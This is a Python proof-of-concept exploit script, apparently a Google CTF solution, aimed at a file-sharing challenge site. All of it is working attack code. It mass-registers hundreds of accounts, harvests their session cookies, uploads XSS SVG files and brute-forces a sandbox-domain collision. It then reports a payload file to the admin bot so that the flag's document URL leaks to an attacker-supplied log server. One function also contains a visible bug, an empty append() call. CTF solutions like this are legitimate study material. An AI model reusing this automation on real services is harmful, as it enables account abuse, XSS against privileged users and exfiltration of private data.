# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import requests
import re
import json
import sys
import argparse
import concurrent.futures
import random

def updateJSON():
  with open(FILE, 'w') as file:
    json.dump(USERS, file, indent=2)

def murl(path):
  return 'https://%s%s' % (DOMAIN, path)

def register(i, sess, csrf):
  sess.post(murl('/register'), data={
    "username": ACC_PREFIX + str(i),
    "password": ACC_PASSWORD,
    "_csrf": csrf
  }, allow_redirects=False)
  USERS['users'].append()

def report(id):
  r = requests.post(murl('/report'), data={
    'fileid': id + '&preview=1'
  })
  print('Reported: %s' % r.text)

def registerAll():
  sess = requests.Session()
  r = sess.get(murl('/login')).text
  csrf = re.findall(r'"_csrf" value="([^"]+)', r)[0]

  with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
    for i in range(0, ACCOUNT_NO):
       executor.submit(register, i, sess, csrf)

def login(i):
  sess = requests.Session()
  r = sess.get(murl('/login')).text
  csrf = re.findall(r'"_csrf" value="([^"]+)', r)[0]
  r = sess.post(murl('/login'), data={
    "username": ACC_PREFIX + str(i),
    "password": ACC_PASSWORD,
    "_csrf": csrf
  });
  uid = re.findall(r'const user_id = (\d+);', r.text)[0]
  return int(uid), sess.cookies['connect.sid'], csrf


def upload(csrf, file, cookie):
  r = requests.post(murl('/upload'), files={
    'file': open(file, 'rb')
  }, data={
    'visibility': 'public',
    '_csrf': csrf
  }, headers={
   'Cookie': 'connect.sid=' + cookie
  }, allow_redirects=False)
  return re.findall(r'#file-(\d+)', r.headers['location'])[0]

def upload2(csrf, data, cookie):
  r = requests.post(murl('/upload'), files={
    'file': ('send_poc.svg', data)
  }, data={
    'visibility': 'public',
    '_csrf': csrf
  }, headers={
   'Cookie': 'connect.sid=' + cookie
  }, allow_redirects=False)
  return re.findall(r'#file-(\d+)', r.headers['location'])[0]


def get_files(cookie):
  return json.loads(requests.get(murl('/user/files'), headers={
    'Cookie': 'connect.sid=' + cookie
  }).text)

def share(file_id, uids, csrf, cookie):
  r = requests.post(murl('/file/share'), headers={
    'x-csrf-token': csrf,
    'cookie': 'connect.sid=' + cookie
  },json={
    'to': uids,
    'file_id': file_id
  })

def refreshCookieThread(i, doUpload):
  uid, cookie, csrf = login(i)
  USERS['users'][i] = [i, uid, cookie, csrf]
  if doUpload:
    upload(csrf,XSS_FILE,cookie)

def refreshCookies(doUpload=False):
  if len(USERS['users']) < ACCOUNT_NO:
    USERS['users'] = [None]*ACCOUNT_NO
    doUpload = True

  with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
    for i in range(0, ACCOUNT_NO):
       executor.submit(refreshCookieThread, i, doUpload)

  updateJSON()

def shareFileToAll():
  with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
    for _, uid, cookie, csrf in USERS['users']:
      uids = list(map(lambda x: x[1], USERS['users']))
      files = list(filter(lambda x: x['owner'] == uid, get_files(cookie)))
      for i in range(0, ACCOUNT_NO, 100):
        executor.submit(share, files[0]['id'], uids[i:i+100], csrf, cookie)

def createFilesMap():
  domains = {}
  for user, uid, cookie, csrf in USERS['users']:
    files = get_files(cookie)
    for file in files:
      user_hash = file['docId'].split('-')[2]
      domains[user_hash] = {'uid': uid, 'owner':file['owner'], 'file_id':file['id']}
  USERS['domains'] = domains

def findDomainThread(cookie, uid, domain, domains):
  if "found" in domains:
    return
  files = get_files(cookie)
  for file in files:
    user_hash = file['docId'].split('-')[2]
    domains[user_hash] = {'uid': uid, 'owner':file['owner']}
    if user_hash == domain:
      domains["found"] = (uid,file['owner'])
      return 1

def findDomain(domain):
  domains = {}
  with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
    for _, uid, cookie, _ in USERS['users']:
       executor.submit(findDomainThread, cookie, uid, domain, domains)

  if not "found" in domains:
    print("Domain not found. Unique domains generated %d" % len(domains.keys()))
    exit(1)

  (uid, oid) = domains["found"]
  owner = next(x for x in USERS['users'] if x[1] == oid)
  user  = next(x for x in USERS['users'] if x[1] == uid)
  return (owner, user)

  # updateJSON()

def findFileThread(owner, user, domain, result):
  if "found" in result: return
  owner_cookie = owner[2]
  user_cookie = user[2]
  file_id = upload(owner[3], XSS_FILE, owner_cookie)
  if "found" in result: return
  r = requests.get(murl('/file') + '?id=%s' % file_id, headers={
      'cookie': 'connect.sid=' + user_cookie
    },allow_redirects=False)
  if r.headers['location'].startswith('//'+domain):
      doc_url = 'https:' + r.headers['location']
      if "found" in result: return
      r2 = requests.get(doc_url, allow_redirects=False)
      nonce, file_url = r2.cookies['nonce'], r2.headers['location']
      if "found" in result: return
      r2 = requests.get('https:' + file_url, headers={
        'cookie': 'connect.sid=' + user_cookie
      },allow_redirects=False)
      real_doc_url = 'https:' + r2.headers['location']

      result["found"] = (real_doc_url, nonce)

def findFile(owner, user, domain):
  result = {}
  with concurrent.futures.ThreadPoolExecutor(max_workers=6) as executor:
    for _ in range(100):
      executor.submit(findFileThread, owner, user, domain, result)
  if not "found" in result: return None, None
  return result["found"]



parser = argparse.ArgumentParser(description='Execute Proof of Concept')
parser.add_argument('--domain', required='--send' in sys.argv, type=str, help="Find collision. Add --send to send it to admin")
parser.add_argument('--prefix', type=str, help='Account prefix for --register and --reset')
parser.add_argument('--reset', action='store_true', default=False, help='Reset the dictionary')
parser.add_argument('--register', action='store_true', default=False, help='Register all accounts')
parser.add_argument('--refresh', action='store_true', default=False, help='Refresh session cookies')
parser.add_argument('--share', action='store_true', default=False, help='Share all files with each others')

parser.add_argument('--leak-domain', action='store_true', default=False, help="Leak flag's domain")
parser.add_argument('--send', action='store_true', default=False, help="Send poc to admin")
parser.add_argument('--log-server', required='--send' in sys.argv or '--leak-domain' in sys.argv, type=str, help="Log server for leaked stuff")


args = parser.parse_args()


DOMAIN = 'chall.secdriven.dev'
ACC_PREFIX = 'poc_' + str(random.randint(0,10000)) + "_"
ACC_PASSWORD = 's3creT-P4ss'
FILE = sys.path[0] + '/users.json'
XSS_FILE = sys.path[0] + '/xss.svg'
XSS_SEND_FILE = sys.path[0] + '/send_to_admin.svg'
ACCOUNT_NO = 400
THREADS = 24
SEND_TO_ADMIN = False

with open(FILE, 'r') as file:
  USERS = json.load(file)


if args.leak_domain:
  if args.refresh:
    refreshCookies()
    print("Refreshed cookies")
  [_,_,cookie,csrf] = USERS['users'][0]
  xss_file = open(XSS_SEND_FILE, 'r').read()

  data = xss_file.replace('$LOG_SERVER', args.log_server)

  file_id = upload2(csrf, data, cookie)
  print("Uploaded file: %s" % file_id)
  report(file_id)
  exit(1)

if args.prefix:
  ACC_PREFIX = args.prefix

if args.reset == True:
  USERS = {"users": []}
  registerAll()
  print("Accounts registered with prefix: %s" % ACC_PREFIX)
  refreshCookies(True)
  print("Cookies refreshed & files uploaded")
  shareFileToAll()
  print("Files shared")



if args.register == True:
  registerAll()
  print("Accounts registered with prefix: %s" % ACC_PREFIX)

if args.refresh == True:
  refreshCookies()
  print("Cookies refreshed")

if args.share == True:
  shareFileToAll()
  print("Files shared")

if args.domain:
  user_domain = args.domain.split('-')[2]
  owner, user = findDomain(user_domain)
  print("Found users (owner:%d, user:%d)" % (owner[1], user[1]))
  doc_url, nonce = findFile(owner, user, args.domain)
  print("Found doc_url %s nonce=%s" % (doc_url, nonce))
  if args.send:
    [_,_,cookie,csrf] = USERS['users'][0]
    xss_file = open(XSS_SEND_FILE, 'r').read()
    data = xss_file.replace('$DOC_URL', doc_url).replace('$NONCE', nonce).replace('$LOG_SERVER', args.log_server)
    file_id = upload2(csrf,data,cookie)
    print("Uploaded file: %s" % file_id)
    report(file_id)



